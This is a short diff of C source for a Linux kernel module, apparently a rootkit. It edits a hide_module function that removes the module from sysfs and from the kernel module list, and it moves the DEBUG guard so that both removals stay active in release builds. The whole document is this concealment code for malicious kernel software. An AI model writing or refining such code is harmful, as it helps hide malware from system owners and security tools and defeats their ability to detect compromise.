@@ -10,7 +10,6 @@ void hide_module(void)
 
 #ifndef DEBUG
     kobject_del(&THIS_MODULE->mkobj.kobj);    
-#endif
-
     list_del(&THIS_MODULE->list);
+#endif
 }
